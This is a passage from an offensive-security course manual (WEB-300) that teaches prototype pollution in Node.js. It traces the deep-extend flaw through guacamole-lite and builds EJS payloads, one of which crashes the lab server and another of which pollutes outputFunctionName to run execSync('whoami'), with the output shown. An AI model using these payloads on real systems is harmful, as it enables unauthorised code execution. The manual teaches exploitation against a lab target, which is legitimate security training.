with a variable in between. However, the target application (not including the additional libraries) 
is so small that searching for a single square bracket is feasible. In other circumstances, this 
would usually have to be done with a manual code review. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
512 
 
Figure 329: Searching for Square Brackets 
The search revealed four files. webpack.config.js is used to generate the client-side code and 
public/js/index.js is the client-side code generated by Webpack. We can ignore these. The only 
other files are routes/index.js and routes/files.js but they uses the square bracket to access an 
array, which protects it from prototype pollution. 
With the application source code ruled out for prototype pollution, let’s start reviewing the 
libraries. To do this, we’ll first run npm list to view the packages. However, when we reviewed 
the package.json file earlier, we noticed that it contained a list of devDependencies. We do not 
need to review these unless we are searching for client-side prototype pollution. To remove those 
from our list, we’ll use -prod as an argument to npm list. 
The deeper we get into the dependency tree, the less likely we are to find an exploitable 
vulnerability. The dependencies of dependencies are less likely to have code that we can actually 
reach. This is true with almost all JavaScript vulnerabilities inside third-party libraries. To 
compensate for this, we’ll also provide the argument -depth 1 to ensure we are only obtaining 
the list of packages and their immediate dependencies. 
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod 
-depth 1 
Creating chips_chips_run ... done 
app@0.0.0 /usr/src/app 
... 
+-- ejs@3.1.6 
| `-- jake@10.8.2 
+-- express@4.16.4 
| +-- accepts@1.3.7 
... 
| +-- fresh@0.5.2 
| +-- merge-descriptors@1.0.1 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
513 
| +-- methods@1.1.2 
... 
| +-- type-is@1.6.18 
| +-- utils-merge@1.0.1 
| `-- vary@1.1.2 
+-- guacamole-lite@0.6.3 
| +-- deep-extend@0.4.2 
| +-- moment@2.29.1 
| `-- ws@1.1.5 
.... 
Listing 590 - npm list Command 
We will search this list for anything that might merge or extend objects. We can find three libraries 
with names that suggests they might do this: merge-descriptors, utils-merge, and deep-extend. 
Reviewing the GitHub repos and source code for merge-descriptors315 and utils-merge,316 we find 
that these basically implement the badMerge function we discussed earlier. That makes these 
libraries immune to prototype pollution. 
However, deep-extend317 might be interesting as it’s described as a library for “Recursive object 
extending.” 
In order to ensure we are reviewing the correct version of the deep-extend library, we will use the 
source code of the library found in node_modules. The main library code can be found in 
node_modules/deep-extend/lib/deep-extend.js. 
... 
82  var deepExtend = module.exports = function (/*obj_1, [obj_2], [obj_N]*/) { 
... 
91      var target = arguments[0]; 
94      var args = Array.prototype.slice.call(arguments, 1); 
95 
96      var val, src, clone; 
97 
98      args.forEach(function (obj) { 
99         // skip argument if isn't an object, is null, or is an array 
100         if (typeof obj !== 'object' || obj === null || Array.isArray(obj)) { 
101                 return; 
102         } 
103 
104         Object.keys(obj).forEach(function (key) { 
105           src = target[key]; // source value 
106           val = obj[key]; // new value 
... 
109           if (val === target) { 
110              return; 
... 
116           } else if (typeof val !== 'object' || val === null) { 
117              target[key] = val; 
118              return; 
... 
 
315 (Ong & Wilson, 2019), https://github.com/component/merge-descriptors 
316 (Hanson, 2020), https://github.com/jaredhanson/utils-merge 
317 (Lotsmanov, 2018), https://www.npmjs.com/package/deep-extend 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
514 
136           } else { 
137              target[key] = deepExtend(src, val); 
138              return; 
139           } 
140         }); 
141      }); 
142 
143      return target; 
144  } 
Listing 591 - Deep Extend Source Code 
Listing 591 shows a code block fairly similar to the vulnerable merge function we discussed 
earlier. The first argument to the deepExtend function will become the target object to extend (line 
91) and the remaining arguments will be looped through (line 98). In our merge example, we 
accepted two objects. In deep-extend, the library will theoretically process an infinite number of 
objects. The keys of the subsequent objects will be looped through and, if the value of the key is 
not an object (line 116), the key of the target will be set to the value of the object to be merged. If 
the value is an object (line 136), deepExtend will recursively call itself, merging the objects. 
Nowhere in the source code would an object with the “__proto__” key be removed. 
This is a perfect example of a library vulnerable to prototype pollution. 
The vulnerability in this specific example is well-known.318 However, the latest version of 
guacamole-lite (at the time of this writing) has not updated the library to the latest version. 
Because of this, we could also use npm audit to discover the vulnerable library as well. 
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm audit 
Creating chips_chips_run ... done 
                                                                                 
                       === npm audit security report ===                         
                                                                                 
                                                                                 
                                 Manual Review                                   
             Some vulnerabilities require your attention to resolve              
                                                                                 
          Visit https://go.npm.me/audit-guide for additional guidance            
                                                                                 
                                                                                 
  Low             Prototype Pollution                                            
                                                                                 
  Package         deep-extend                                                    
                                                                                 
  Patched in      >=0.5.1                                                        
                                                                                 
  Dependency of   guacamole-lite                                                 
                                                                                 
  Path            guacamole-lite > deep-extend                                   
                                                                                 
  More info       https://npmjs.com/advisories/612                               
                                                                                 
found 1 low severity vulnerability in 1071 scanned packages 
 
318 (Roger, 2018), https://github.com/unclechu/node-deep-extend/issues/39 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
515 
  1 vulnerability requires manual review. See the full report for details. 
ERROR: 1 
Listing 592 - NPM Audit Displaying Vulnerable Package 
However, this won’t always be the case, and knowing how to manually find packages like this is 
an important skill. 
Many developers don’t bother to fix issues like this because they are reported as “low” risk. As 
we’ll find later, these are certainly not low-risk issues when paired with a proper exploit. 
Now that we’ve discovered a library that is vulnerable to prototype pollution, let’s find where it is 
used. The npm list command showed us that this was found in the guacamole-lite library. 
First, let’s review the directory structure of node_modules/guacamole-lite so we know which files 
to review. 
├── index.js 
├── lib 
│   ├── ClientConnection.js 
│   ├── Crypt.js 
│   ├── GuacdClient.js 
│   └── Server.js 
├── LICENSE 
├── package.json 
└── README.md 
Listing 593 - Directory Structure of Guacamole-lite 
The LICENSE, package.json, and README.md files can be safely ignored. The index.js file only 
exports the Server.js file, which initializes the library. We’ll start our review with Server.js. 
001  const EventEmitter = require('events').EventEmitter; 
002  const Ws = require('ws'); 
003  const DeepExtend = require('deep-extend'); 
004 
005  const ClientConnection = require('./ClientConnection.js'); 
006 
007  class Server extends EventEmitter { 
008 
009    constructor(wsOptions, guacdOptions, clientOptions, callbacks) { 
... 
034      DeepExtend(this.clientOptions, { 
035        log: { 
... 
039        }, 
040 
041        crypt: { 
042          cypher: 'AES-256-CBC', 
043        }, 
044 
045        connectionDefaultSettings: { 
046          rdp: { 
047            'args': 'connect', 
048            'port': '3389', 
049            'width': 1024, 
050            'height': 768, 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
516 
051            'dpi': 96, 
052          }, 
... 
074        }, 
075 
076        allowedUnencryptedConnectionSettings: { 
... 
103       } 
104 
105     }, clientOptions); 
... 
133   } 
... 
147   newConnection(webSocketConnection) { 
148     this.connectionsCount++; 
149     this.activeConnections.set(this.connectionsCount, new ClientConnection(this, 
this.connectionsCount, webSocketConnection)); 
150    } 
151  } 
152 
153  module.exports = Server; 
Listing 594 - Server.js 
Within Server.js, we find that the DeepExtend library is indeed imported on line 3 and used on line 
34. However, this is only used to initialize the guacamole-lite server. As the name implies, client 
connections are handled by ClientConnection.js, according to lines 5 and 149. This is initialized 
when a new connection is made. 
While this file is vulnerable to prototype pollution, it is not exploitable using user-supplied data, as 
the arguments passed to DeepExtend here are passed when the server is initialized and no user-
controlled input is accepted at that time. 
This initialization is found in bin/www. 
... 
10  const GuacamoleLite = require('guacamole-lite'); 
11  const clientOptions = require("../settings/clientOptions.json") 
12  const guacdOptions = require("../settings/guacdOptions.json"); 
... 
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions); 
... 
Listing 595 - bin/www File 
The library is initialized with guacdOptions and clientOptions which are loaded from JSON files, 
not user input. 
However, since the requests that might contain user input are handled by the 
node_modules/guacamole-lite/lib/ClientConnection.js, this file is worth reviewing. 
001  const Url = require('url'); 
002  const DeepExtend = require('deep-extend'); 
003  const Moment = require('moment'); 
004  
005  const GuacdClient = require('./GuacdClient.js'); 
006  const Crypt = require('./Crypt.js'); 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
517 
007  
008  class ClientConnection { 
009  
010    constructor(server, connectionId, webSocket) { 
... 
023 
024      try { 
025        this.connectionSettings = this.decryptToken(); 
... 
029        this.connectionSettings['connection'] = this.mergeConnectionOptions(); 
030 
031      }  
... 
054    } 
... 
132    mergeConnectionOptions() { 
... 
140      let compiledSettings = {}; 
141 
142      DeepExtend( 
143        compiledSettings, 
144        this.server.clientOptions.connectionDefaultSettings[this.connectionType], 
145        this.connectionSettings.connection.settings, 
146        unencryptedConnectionSettings 
147      ); 
148 
149      return compiledSettings; 
150    } 
... 
159  } 
... 
Listing 596 - ClientConnection.js 
We again find that the deep-extend library is imported into this file on line 2. This is a good sign 
for us. We also find that the constructor will first decrypt a token on line 25 and save it to the 
this.connectionSettings variable. The token parameter we found earlier was encrypted. 
After the token is decrypted, the file will run mergeConnectionOptions, which calls deep-extend 
(lines 142-147) with the most notable arguments being the decrypted settings from the user input 
(line 145). More specifically, the settings object within the connection object is passed to the 
DeepExtend function. This is why the payload worked in the settings object during blackbox 
discovery, but not the connection object. 
Now that we understand where and why the application is vulnerable, let’s move on to doing 
something more useful than denial of service. 
13.2.4.1 Exercise 
Remotely debug the application and send the payload we sent earlier that crashed the 
application. Set a breakpoint on the mergeConnectionOptions function and step into the 
DeepExtend function. Don’t step over the for loop. Instead, observe the variables that get passed 
and how they get merged. Also, observe the object prototype being overwritten. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
518 
13.2.4.2 Extra Miles 
1. 
Find a value (other than toString) that will crash the application when it is set in the 
prototype. 
2. 
So far, we have been able to obtain the token because this application allows the user to 
provide their own settings. This might not always be the case. We’ve introduced a directory 
traversal vulnerability into the application. Use this directory traversal to obtain the source 
for the encryption function and the encryption key. Generate a token, decrypt it, modify any 
parameter, and re-encrypt it. Use this modified token to connect to the RDP client. 
13.3 Prototype Pollution Exploitation 
A useful prototype pollution exploit is application- and library-dependent. 
For example, if the application has admin and non-admin users, it might be possible to set 
isAdmin to true in the Object prototype, convincing the application that all users are 
administrators. However, this also assumes that non-admin users never have the isAdmin 
parameter explicitly set to false. If isAdmin was set to false in the object directly, the prototype 
chain wouldn’t be used for that variable. 
As with most web applications, our ultimate goal is achieving remote code execution. With 
prototype pollution, we may be able to reach code execution if we find a point in the application 
where undefined variables are appended to a child_process.exec, eval or vm.runInNewContext 
function, or similar. 
Consider the following example code: 
function runCode (code, o) { 
  let logCode = "" 
  if (o.log){ 
    if (o.preface){ 
      logCode = "console.log('" + o.preface + "');" 
    } 
    logCode += "console.log('Running Eval');" 
  } 
 
  eval(logCode + code); 
} 
 
options = {"log": true} 
 
runCode("console.log('Running some random code')", options) 
Listing 597 - Code That Would Let us Reach RCE 
Listing 597 shows us the types of code blocks we should search for that would let us reach code 
execution. In this example, the log key in the options object is explicitly set to true. However, the 
preface is not explicitly set. If we injected a payload into the preface key in the Object prototype 
before options is set, we would be able to execute arbitrary JavaScript code. 
> {}.__proto__.preface = "');console.log('RUNNING ANY CODE WE WANT')//" 
"');console.log('RUNNING ANY CODE WE WANT')//" 
 
> options = {"log": true} 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
519 
{ log: true } 
 
> runCode("console.log('Running some random code')", options) 
 
RUNNING ANY CODE WE WANT 
undefined 
Listing 598 - Using Prototype Pollution to Inject into runCode 
As shown in Listing 598, we were successfully able to inject our own console.log statement and 
comment out the others. 
Third-party libraries often contain these types of code blocks, and developers may implement 
them without realizing the risk. 
Let’s review the non-development dependencies again. This time, we will run npm list with -
depth 0 since we’re attempting to exploit the packages immediately available to us. If we don’t 
find anything to exploit here, we could increase the depth. However, as we increase the depth, we 
also decrease the likelihood of finding a viable execution path. 
student@oswe:~$ docker-compose -f ~/chips/docker-compose.yml run chips npm list -prod 
-depth 0 
Creating chips_chips_run ... done 
app@0.0.0 /usr/src/app 
+-- cookie-parser@1.4.5 
+-- debug@2.6.9 
+-- dockerode@3.2.1 
+-- dotenv@8.2.0 
+-- ejs@3.1.6 
+-- express@4.16.4 
+-- guacamole-lite@0.6.3 
+-- hbs@4.1.1 
+-- http-errors@1.6.3 
+-- morgan@1.9.1 
`-- pug@3.0.2 
Listing 599 - NPM List with Depth of 0 
The packages that are worth investigating include dockerode, ejs, hbs, and pug. At first glance, 
dockerode seems like the type of library that would run system commands to control Docker. 
However, in practice it uses requests sent to the socket. While this may still lead to command 
execution, we did not discover an attack vector for prototype pollution in this package. 
The three templating engine packages, ejs, hbs, and pug, are a different story. JavaScript 
templating engines often compile a template into JavaScript code and evaluate the compiled 
template. A library like this is perfect for our purposes. If we can find a way to inject code during 
the compilation process or during the conversion to JavaScript code, we might be able to achieve 
command execution. 
13.4 EJS 
Let’s start by reviewing EJS. We’ll begin by attempting to use prototype pollution to crash the 
application. This will confirm that the server is running with EJS (which would be useful in a 
blackbox situation). 
Once this proof of concept is complete, we’ll attempt to obtain RCE. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
520 
13.4.1 EJS - Proof of Concept 
Out of the three common templating engines for JavaScript, EJS is on the simpler side. The 
actual JavaScript code that runs EJS is 1120 lines while Handlebars has 5142 and Pug is at 5853 
(not including non-Pug dependencies). 
For this reason, we’ll start with EJS to familiarize ourselves with the process, and then move on to 
more complicated libraries like Handlebars and Pug. 
One of the components that make EJS simpler than Pug and Handlebars is that EJS lets 
developers write pure JavaScript to generate templates. Other templating engines, like Pug and 
Handlebars are essentially separate languages that must be parsed and compiled into 
JavaScript. 
To discover how to exploit EJS using prototype pollution, we’ll use the interactive Node CLI. This 
will allow us to load the EJS module, run functions, and debug them directly without having to 
reload the web page. This will obviously allow us to reload the CLI quicker when we break things 
with prototype pollution since we won’t have to restart the web server. When we get a working 
payload using the CLI, we’ll use that information to exploit the web application. 
Let’s begin by starting Node in the application container of the target server. We’ll again use the 
docker-compose command with the exec directive to execute a command in the chips 
container. We’ll run the node command to start the interactive CLI. 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
>  
Listing 600 - Running Node In the Docker Container 
Now that we have our interactive CLI running, let’s render an EJS template. According to the 
documentation,319 we can render a template by using the compile function or the render function: 
let template = ejs.compile(str, options); 
template(data); 
// => Rendered HTML string 
 
ejs.render(str, data, options); 
// => Rendered HTML string 
Listing 601 - EJS Documentation 
Let’s inspect the compile function in our IDE by opening node_modules/ejs/lib/ejs.js. The relevant 
code starts on line 379. 
379  exports.compile = function compile(template, opts) { 
380    var templ; 
381   
382    // v1 compat 
383    // 'scope' is 'context' 
384    // FIXME: Remove this in a future version 
 
319 (EJS, 2021), https://ejs.co/#docs 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
521 
385    if (opts && opts.scope) { 
386      if (!scopeOptionWarned){ 
387        console.warn('`scope` option is deprecated and will be removed in EJS 3'); 
388        scopeOptionWarned = true; 
389      } 
390      if (!opts.context) { 
391        opts.context = opts.scope; 
392      } 
393      delete opts.scope; 
394    } 
395    templ = new Template(template, opts); 
396    return templ.compile(); 
397  }; 
Listing 602 - EJS Compile Function 
The compile function accepts two arguments: a template string and an options object. After 
checking for deprecated options, a variable is created from the Template class and the compile 
function is executed within the Template object. 
A quick review of the render function reveals that it is a wrapper for the compile function with a 
cache. Let’s try executing both functions with a simple template. 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --
inspect=0.0.0.0:9228 
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
 
> let ejs = require('ejs'); 
undefined 
 
> let template = ejs.compile("Hello, <%= foo %>", {}) 
undefined 
 
> template({"foo":"world"}) 
'Hello, world' 
 
> ejs.render("Hello, <%= foo %>", {"foo":"world"}, {}) 
'Hello, world' 
Listing 603 - Rendering a Template with EJS 
Next, we provide the compile and render functions a template, some data, and options. The 
response is a compiled Javascript function. When run, the function outputs “Hello, World”. 
Let’s review the Template class in search of a prototype pollution exploit vector. 
507  function Template(text, opts) { 
508    opts = opts || {}; 
509    var options = {}; 
510    this.templateText = text; 
511    /** @type {string | null} */ 
512    this.mode = null; 
513    this.truncate = false; 
514    this.currentLine = 1; 
515    this.source = ''; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
522 
516    options.client = opts.client || false; 
517    options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML; 
518    options.compileDebug = opts.compileDebug !== false; 
519    options.debug = !!opts.debug; 
520    options.filename = opts.filename; 
521    options.openDelimiter = opts.openDelimiter || exports.openDelimiter || 
_DEFAULT_OPEN_DELIMITER; 
522    options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || 
_DEFAULT_CLOSE_DELIMITER; 
523    options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER; 
524    options.strict = opts.strict || false; 
525    options.context = opts.context; 
... 
Listing 604 - Template Class 
Reviewing the beginning of the Template class, we find that the options object is parsed from 
lines 516-525. However, many values are only set if the value exists. This is a perfect location to 
inject with a prototype pollution vulnerability. 
The escapeFunction value is set to the opts.escape value. If we remember the modifications to 
the toString function, when an application or library expects a function but instead receives a 
string, the application crashes. 
Let’s set this option to a function, as the application expects, and review the output. 
> o = { 
...   "escape" : function (x) { 
.....     console.log("Running escape"); 
.....     return x; 
.....   } 
... } 
{ escape: [Function: escape] } 
 
> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o) 
Running escape 
'Hello, world' 
Listing 605 - Custom Escape Function 
Our escape function accepts a parameter(x), logs a message, and returns the x parameter. When 
rendering a template with the escape function, the message is logged and the template is 
returned. 
Next, let’s replace the function with a string, and observe the error. 
> o = {"escape": "bar"} 
{ escape: 'bar' } 
 
> ejs.render("Hello, <%= foo %>", {"foo":"world"}, o) 
Uncaught TypeError: esc is not a function 
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18) 
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), 
<anonymous>:15:3) 
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17) 
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37) 
Listing 606 - Escape Function Set to String 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
523 
As expected, the application throws an error. We can also verify that we can inject into this option 
with prototype pollution by polluting the Object prototype and passing in an empty object. 
> {}.__proto__.escape = "haxhaxhax" 
'haxhaxhax' 
 
> <span custom-style="BoldCodeUser">ejs.render("Hello, <%= foo %>", {"foo":"world"}, 
{})<span custom-style="BoldCodeUser"> 
Uncaught TypeError: esc is not a function 
    at rethrow (/usr/src/app/node_modules/ejs/lib/ejs.js:342:18) 
    at eval (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:662:12), 
<anonymous>:15:3) 
    at anonymous (/usr/src/app/node_modules/ejs/lib/ejs.js:692:17) 
    at Object.exports.render (/usr/src/app/node_modules/ejs/lib/ejs.js:423:37) 
Listing 607 - Setting Escape in the Object Prototype 
This also returns an error. However, this is great for us because we can determine if the target 
application is running EJS. If a prototype pollution vulnerability sets escape to a string, and the 
application crashes, we know we are dealing with an application running EJS. 
Let’s attempt to crash our target application. In our payload, we’ll set escape to a string, generate 
a token, and use that token to load a guacamole-lite session. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
524 
 
Figure 330: Generating a Token 
With the token generated, let’s send the request to guacamole-lite and exploit the prototype 
pollution. This time, we’ll send the request directly to the /guaclite endpoint instead of /rdp so we 
can keep this process in Burp. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
525 
 
Figure 331: Loading RDP 
The response indicates a switch to the WebSocket protocol, which means the token was 
processed. However, when a new page is loaded, the application crashes. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
526 
 
Figure 332: Application Crash 
While it might seem that we are in the same position as we were earlier when we overwrote the 
toString function, we have discovered something that is very useful. In blackbox scenarios, the 
toString function is a great method to discover if the application is vulnerable to prototype 
pollution. However, this EJS proof of concept can be used to narrow down the templating engine 
that is being used in the application. 
Next, let’s attempt to obtain RCE using EJS. 
13.4.1.1 Exercises 
1. 
Follow along and provide the --inspect=0.0.0.0:9228 argument when starting the 
interactive node CLI if not already provided. Connect a remote debugger, set a breakpoint 
where the options are parsed, and step through the execution flow. Make sure that the 
application is running with EJS as the templating engine 
2. 
Crash the application using the payload we created. 
3. 
Fix the issue you just created after you verified it worked. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
527 
13.4.2 EJS - Remote Code Execution 
At this point, we’ve learned that templating engines compile the template into a JavaScript 
function. The most natural progression to achieve RCE would be to inject custom JavaScript into 
the template function during compilation. When the template function executes, so would our 
injected code. Let’s review how a template is rendered in EJS. 
let template = ejs.compile(str, options); 
template(data); 
// => Rendered HTML string 
Listing 608 - EJS Rendering 
We’ll again review the compile function in our IDE by opening node_modules/ejs/lib/ejs.js. 
379  exports.compile = function compile(template, opts) { 
380    var templ; 
381   
382    // v1 compat 
383    // 'scope' is 'context' 
384    // FIXME: Remove this in a future version 
385    if (opts && opts.scope) { 
386      if (!scopeOptionWarned){ 
387        console.warn('`scope` option is deprecated and will be removed in EJS 3'); 
388        scopeOptionWarned = true; 
389      } 
390      if (!opts.context) { 
391        opts.context = opts.scope; 
392      } 
393      delete opts.scope; 
394    } 
395    templ = new Template(template, opts); 
396    return templ.compile(); 
397  }; 
Listing 609 - EJS Compile Function 
The last step in this compile function is to run the Template.compile function. We will start 
reviewing from this last step to find if we can inject into the template near the end of the process. 
This will lower the risk of the prototype pollution interfering with normal operation of the 
application and our payload has less chance of getting modified in the process. 
The Template.compile function is defined in the same source file starting on line 569. 
569    compile: function () { 
... 
574      var opts = this.opts; 
... 
584      if (!this.source) { 
585        this.generateSource(); 
586        prepended += 
587          '  var __output = "";\n' + 
588          '  function __append(s) { if (s !== undefined && s !== null) __output += 
s }\n'; 
589        if (opts.outputFunctionName) { 
590          prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n'; 
591        } 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
528 
... 
609      } 
Listing 610 - Template Class compile Function 
The compile function in the Template class is relatively small and we quickly discover a vector for 
prototype pollution. On line 589, the code checks if the outputFunctionName variable within the 
opts object exists. If the variable does exist, the variable is added to the content. 
A quick search through the code finds that this variable is only set by a developer using the EJS 
library. The documentation states that this variable is: 
Set to a string (e.g., ‘echo’ or ‘print’) for a function to print output inside scriptlet 
tags. 
In practice, it can be used as follows: 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --
inspect=0.0.0.0:9228 
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
> ejs  = require("ejs") 
 
> ejs.render("hello <% echo('world'); %>", {}, {outputFunctionName: 'echo'}); 
'hello world' 
Listing 611 - outputFunctionname in EJS 
The outputFunctionName is typically not set in templates. Because of this, we can most likely use 
it to inject with prototype pollution. 
Let’s examine the string that we would be injecting into on line 590 of node_modules/ejs/lib/ejs.js. 
 'var ' + opts.outputFunctionName + ' = __append;' 
Listing 612 - Location of Potential Injection 
For this to work, our payload will need to complete the variable declaration on the left side, add 
the code we want to run in the middle, and complete the variable declaration on the right side. If 
our payload makes the function invalid, EJS will crash when the page is rendered. 
 var x = 1; WHATEVER_JSCODE_WE_WANT ; y = __append;' 
Listing 613 - RCE Injection POC 
The highlighted portion in Listing 613 shows what our payload may be. Let’s use the interactive 
CLI to attempt to log something to the console. 
> ejs  = require("ejs") 
... 
> ejs.render("Hello, <%= foo %>", {"foo":"world"}) 
'Hello, world' 
 
> {}.__proto__.outputFunctionName = "x = 1; console.log('haxhaxhax') ; y" 
"x = 1; console.log('haxhaxhax') ; y" 
 
> ejs.render("Hello, <%= foo %>", {"foo":"world"}) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
529 
haxhaxhax 
'Hello, world' 
Listing 614 - Code Execution via CLI 
Now that we’ve confirmed our approach works via the interactive CLI, let’s attempt to exploit this 
in the target application. 
Make sure that the TEMPLATING_ENGINE is set to ‘ejs’ when starting docker-
compose. This will ensure we are using the ejs templating engine. 
This time, we’ll use a payload that will execute a system command and output the response to 
the console. 
"__proto__": 
{ 
    "outputFunctionName":   "x = 1; 
console.log(process.mainModule.require('child_process').execSync('whoami').toString())
; y" 
} 
Listing 615 - EJS Payload 
We’ll set the payload in the proper request location. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
530 
 
Figure 333: Code Execution via outputFunctionName - Request 
Once the token is returned, we’ll use it to pollute the prototype. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
531 
 
Figure 334: Polluting the Prototype with RDP request 
Now, let’s visit any page on the chips server and review the output of the log. 
chips_1     | root 
chips_1     |  
chips_1     | root 
chips_1     |  
chips_1     | root 
chips_1     |  
chips_1     | GET / 200 32.799 ms - 4962 
Listing 616 - Docker Compose Log Output 
Excellent! Our console.log payload was executed three times, proving that we can execute code 
against the server. 
13.4.2.1 Exercises 
1. 
Follow along with this section but connect to the remote debugger and observe the 
prototype pollution exploit. 
2. 
Obtain a shell. 
13.4.2.2 Extra Mile 
Earlier, we used the escape variable to detect if the target is running EJS. We can also use this 
variable to obtain RCE with some additional payload modifications. Find how to obtain RCE by 
polluting the escape variable. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
532 
13.5 Handlebars 
Now that we’ve learned how to detect if the target application is running EJS and how to obtain 
command execution, let’s do the same using Handlebars. 
13.5.1 Handlebars - Proof of Concept 
To build a Handlebars proof of concept, we are going use techniques that were discovered by 
security researcher Beomjin Lee.320 Before we begin, we will restart the application to use the 
handlebars templating engine. 
student@chips:~/chips$ docker-compose down 
Stopping chips_chips_1 ... done 
Stopping rdesktop      ... done 
Stopping guacd         ... done 
Removing chips_chips_1 ... done 
Removing rdesktop      ... done 
Removing guacd         ... done 
Removing network chips_default 
 
student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-
compose.yml up 
... 
Listing 617 - Restarting Chips 
Unlike EJS, we do not need to crash an application to detect if it is running Handlebars. However, 
the size of the Handlebars library makes discovering paths that lead to exploitation labor-
intensive. 
While Handlebars is written on top of JavaScript, it redefines basic functionality into its own 
templating language. For example, to loop through each item in an array, a Handlebars template 
would use the each helper. 
{{#each users}} 
  <p>{{this}}</p> 
{{/each}} 
Listing 618 - Handlebars Each Helper 
EJS, on the other hand, would have used JavaScript’s forEach method. 
<% users.forEach(function(user){ %> 
  <p><%= user %></p> 
<% }); %> 
Listing 619 - EJS forEach 
Since Handlebars redefines some standard functions, its parsing logic is more complicated than 
EJS. 
The 
main 
functionality 
of 
the 
Handlebars 
library 
is 
loaded 
from 
the 
node_modules/handlebars/dist/cjs directory. Let’s analyze the directory structure to understand 
where to start reviewing. 
 
320 (Lee, 2020), https://blog.p6.is/AST-Injection/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
533 
├── handlebars 
│   ├── base.js 
│   ├── compiler 
│   │   ├── ast.js 
│   │   ├── base.js 
│   │   ├── code-gen.js 
│   │   ├── compiler.js 
│   │   ├── helpers.js 
│   │   ├── javascript-compiler.js 
│   │   ├── parser.js 
│   │   ├── printer.js 
│   │   ├── visitor.js 
│   │   └── whitespace-control.js 
│   ├── decorators 
│   │   └── inline.js 
│   ├── decorators.js 
│   ├── exception.js 
│   ├── helpers 
... 
│   │   └── with.js 
│   ├── helpers.js 
│   ├── internal 
... 
│   │   └── wrapHelper.js 
│   ├── logger.js 
│   ├── no-conflict.js 
